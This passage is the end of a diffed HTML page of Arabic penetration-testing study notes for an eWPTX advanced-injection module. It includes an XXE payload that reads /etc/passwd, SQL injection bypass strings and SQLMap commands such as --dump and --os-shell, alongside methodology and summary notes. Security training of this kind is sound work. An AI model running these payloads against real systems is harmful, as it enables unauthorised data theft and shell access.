+<div class="step-body"><p>وضع مرجع للكيان المُعرَّف جوه جسم طلب XML.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تنفيذ وإقناع التطبيق بإرجاع النتيجة</div>
+<div class="step-body"><p>بعد إرسال الطلب وإجبار المحلّل على جلب المحتوى الخبيث، لازم نقنع التطبيق يعرض المعلومات المُرسَلة مرة تانية — مثلًا لما المستلم يقرأ الرسالة، هيشوف محتوى الملف المحلي كمان.</p></div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">xxe — local file disclosure</span><pre><code>&lt;!DOCTYPE message [
+  &lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;message&gt;
+  &lt;body&gt;&amp;xxefile;&lt;/body&gt;
+&lt;/message&gt;
+
+&lt;!-- عند معالجة الرسالة، المستلم هيشوف محتوى /etc/passwd جوه جسم الرسالة --&gt;
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ METHODOLOGY -->
+<h2 id="methodology"><span class="num">--</span><span class="htext">خريطة قرار اختيار نوع الحقن</span></h2>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 150" xmlns="http://www.w3.org/2000/svg">
+  <rect x="5" y="55" width="105" height="55" rx="7" class="dsvg-box-b"/>
+  <text x="57" y="78" text-anchor="middle" class="dsvg-blue" font-size="10.5" font-weight="700">تحديد نقطة الإدخال</text>
+  <text x="57" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">Fuzzing أساسي</text>
+
+  <rect x="150" y="55" width="110" height="55" rx="7" class="dsvg-box-a"/>
+  <text x="205" y="78" text-anchor="middle" class="dsvg-amber" font-size="10.5" font-weight="700">تحديد التقنية الخلفية</text>
+  <text x="205" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">SQL/NoSQL/LDAP/XML</text>
+
+  <rect x="300" y="55" width="110" height="55" rx="7" class="dsvg-box"/>
+  <text x="355" y="78" text-anchor="middle" class="dsvg-txt" font-size="10.5" font-weight="700">اختيار Payload مناسب</text>
+  <text x="355" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">حسب النوع المكتشَف</text>
+
+  <rect x="450" y="55" width="110" height="55" rx="7" class="dsvg-box-r"/>
+  <text x="505" y="78" text-anchor="middle" class="dsvg-red" font-size="10.5" font-weight="700">يدوي ثم آلي</text>
+  <text x="505" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">تأكيد ثم SQLMap</text>
+
+  <rect x="600" y="55" width="95" height="55" rx="7" class="dsvg-box-g"/>
+  <text x="647" y="78" text-anchor="middle" class="dsvg-green" font-size="10.5" font-weight="700">استغلال وتوثيق</text>
+  <text x="647" y="95" text-anchor="middle" class="dsvg-muted" font-size="8">تأثير حقيقي</text>
+
+  <line x1="110" y1="82" x2="150" y2="82" class="dsvg-line"/>
+  <line x1="260" y1="82" x2="300" y2="82" class="dsvg-line"/>
+  <line x1="410" y1="82" x2="450" y2="82" class="dsvg-line"/>
+  <line x1="560" y1="82" x2="600" y2="82" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">المسار المنطقي للانتقال من اكتشاف نقطة إدخال عرضة وحتى استغلال موثَّق</div>
+</div>
+
+<ul>
+<li>ابدأ دايمًا بتحديد التقنية الخلفية (Backend) — حقن SQL مختلف تمامًا عن NoSQL أو LDAP أو XML، وPayload الخاطئ هيضيّع وقتك</li>
+<li>المدخل اللي بيقبل علامة اقتباس مفردة بدون خطأ واضح مش دايمًا معناه آمن — جرّب Boolean وTime-Based كطبقة تانية</li>
+<li>لو التطبيق بيعرض رسائل خطأ واضحة، ابدأ بـ Error-Based — الأسرع في استخراج المعلومات</li>
+<li>لو مفيش أي استجابة ملحوظة، انتقل لـ OOB عبر DNS/HTTP Collaborator بدل ما تفترض إن الثغرة مش موجودة</li>
+<li>لا تنسَ Second-Order — افحص أي مكان بيانات المستخدم بتتخزّن وتُستخدَم لاحقًا في استعلام مختلف</li>
+</ul>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="num">--</span><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>Payloads SQLi شائعة</h4>
+<div class="code-wrap"><span class="code-tag">common sqli payloads</span><pre><code>' OR '1'='1
+' OR 1=1 --
+" OR 1=1 --
+' OR 'x'='x
+admin' --
+admin' #
+' having 1=1 --
+' AND id IS NULL; --
+' OR '1'='1' /* -- MySQL
+' OR '1'='1' %00
+</code></pre></div>
+
+<h4>أوامر SQLMap الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">quick reference</span><pre><code>sqlmap -u "<url>" --dbs
+sqlmap -u "<url>" -D <db> --tables
+sqlmap -u "<url>" -D <db> -T <table> --dump
+sqlmap -u "<url>" --technique=B
+sqlmap -u "<url>" --level=3 --risk=2
+sqlmap -u "<url>" --os-shell
+</code></pre></div>
+
+<h4>موارد مرجعية</h4>
+<ul>
+<li>OWASP WSTG — <code>https://owasp.org/www-project-web-security-testing-guide/</code></li>
+<li>OWASP SQLi Testing Checklist — <code>github.com/tanprathan/OWASP-Testing-Checklist</code></li>
+<li>SQL Injection Payload List — <code>github.com/payloadbox/sql-injection-payload-list</code></li>
+<li>PortSwigger SQLi Cheat Sheet — <code>portswigger.net/web-security/sql-injection/cheat-sheet</code></li>
+<li>PayloadsAllTheThings (NoSQL Injection) — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+<li>SQLMap — <code>sqlmap.org</code> / <code>github.com/sqlmapproject/sqlmap</code></li>
+</ul>
+
+<h4>Quick Wins — أسرع المسارات في اختبار الحقن</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>التحقق</th><th>الأداة/الطريقة</th><th>النوع المحتمَل</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>رسالة خطأ DBMS ظاهرة عند حقن علامة اقتباس؟</td><td>فحص يدوي</td><td>Error-Based SQLi</td></tr>
+<tr><td>2</td><td>عدد الأعمدة يتطابق عبر ORDER BY؟</td><td>UNION SELECT NULL تدريجي</td><td>Union-Based SQLi</td></tr>
+<tr><td>3</td><td>تأخير ملحوظ عند SLEEP()؟</td><td>مقارنة وقت الاستجابة</td><td>Time-Based Blind SQLi</td></tr>
+<tr><td>4</td><td>مفيش استجابة ملحوظة أبدًا؟</td><td>Burp Collaborator / dnslog.cn</td><td>OOB SQLi</td></tr>
+<tr><td>5</td><td>بيانات مخزَّنة بتُستخدَم لاحقًا في استعلام تاني؟</td><td>تتبّع تدفّق البيانات</td><td>Second-Order SQLi</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده غطّى أخطر فئة ثغرات الويب بعمق — من أساسيات SQL Injection وأتمتتها بـ SQLMap، مرورًا بتقنيات OOB وSecond-Order المتقدّمة، ووصولًا لـ NoSQL وLDAP وORM وXXE.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./ewptx_module03_summary.txt</div>
+<ul>
+<li>هجمات الحقن بتستهدف أي نقطة بيتعامل فيها التطبيق مع مدخلات غير موثوقة — من قواعد البيانات العلائقية وحتى محلّلات XML</li>
+<li>SQL Injection بينقسم لـ In-Band (Error/Union)، Blind (Boolean/Time)، وOut-of-Band — كل نوع يحتاج منهجية اكتشاف مختلفة</li>
+<li>اختبر يدويًا أولًا دايمًا قبل أتمتة الاستغلال بـ SQLMap — الأتمتة الكاملة بدون فهم مسبق خطر على استقرار الهدف</li>
+<li>OOB SQLi حل أساسي لما مفيش أي استجابة مباشرة أو ملحوظة من التطبيق</li>
+<li>Second-Order SQLi بيوضّح إن تنقية المدخلات في نقطة واحدة مش كافية — لازم فحص كل مكان تُستخدَم فيه البيانات المخزَّنة</li>
+<li>NoSQL وLDAP وORM مش محصَّنة من الحقن رغم طبقات التجريد الإضافية — المدخلات غير المُنقَّاة خطر في أي طبقة</li>
+<li>XXE من أخطر أنواع حقن XML — يمكن أن يؤدي لكشف ملفات حساسة، SSRF، أو حرمان من الخدمة</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>الفكرة الجوهرية للموديول:</strong> هجمات الحقن كلها، بغضّ النظر عن التقنية الخلفية، مبنية على نفس المبدأ — ثقة زائدة في مدخلات المستخدم بدون تحقّق أو تنقية كافية. المختبر المحترف بيفكّر في كل حقل إدخال كبوابة محتملة لنظام خلفي، مهما كانت الطبقة اللي بتفصلهم (ORM، API، أو أي تجريد آخر).</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">Professional Mindset</div>
+<p>قبل ما تفتح SQLMap، افهم التطبيق يدويًا أولًا — نوع قاعدة البيانات، طبيعة المدخلات، وهل فيه طبقة ORM أو WAF بينك وبين الاستعلام الفعلي. اختبر حقنة واحدة في كل مرة، ووثّق كل Payload جرّبته والنتيجة المقابلة له — ده اللي هيفرّق بين تقرير احترافي قابل لإعادة الإنتاج وتقرير مبهم.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الثالث — Advanced Injection Attacks (eWPTXv3)</em></p>
+<div class="footer-note">-- EOF: ewptx-module-03/advanced-injection-attacks.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
